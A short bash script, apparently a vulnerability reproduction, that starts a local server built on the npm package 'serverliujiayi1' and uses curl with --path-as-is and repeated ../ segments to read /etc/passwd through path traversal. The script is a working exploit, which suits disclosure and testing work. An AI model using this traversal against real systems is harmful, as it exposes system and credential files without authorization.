#!/bin/bash

JS_FILE="server.js"

# create js file
echo "var pkg = require('serverliujiayi1');" > $JS_FILE

# run server
node $JS_FILE > /dev/null 2>&1 &
PID=$!

sleep 1.5

# get /etc/passwd
curl --path-as-is http://localhost:9000/../../../../../../../../etc/passwd

# kill server
kill -9 $PID
rm $JS_FILE